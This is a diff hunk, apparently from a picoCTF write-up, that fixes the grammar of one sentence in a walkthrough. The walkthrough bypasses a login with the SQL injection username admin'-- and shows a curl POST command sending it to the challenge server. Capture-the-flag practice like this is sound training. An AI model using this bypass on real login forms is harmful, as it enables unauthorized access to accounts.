@@ -39,7 +39,7 @@ Let's go to `login.html` by `curl https://jupiter.challenges.picoctf.org/problem
         </fieldset>
     </form>
 ```
-Try going to `login.php` by `curl https://jupiter.challenges.picoctf.org/problem/64649/login.php`. Login will be failed. Try username as `admin'--` and password as `asdf` (anything).
+Try going to `login.php` by `curl https://jupiter.challenges.picoctf.org/problem/64649/login.php`. Login will fail. Try username as `admin'--` and password as `asdf` (anything).
 `curl https://jupiter.challenges.picoctf.org/problem/64649/login.php --data "username=admin'--&password=asdf"`.
 Flag found!!
 
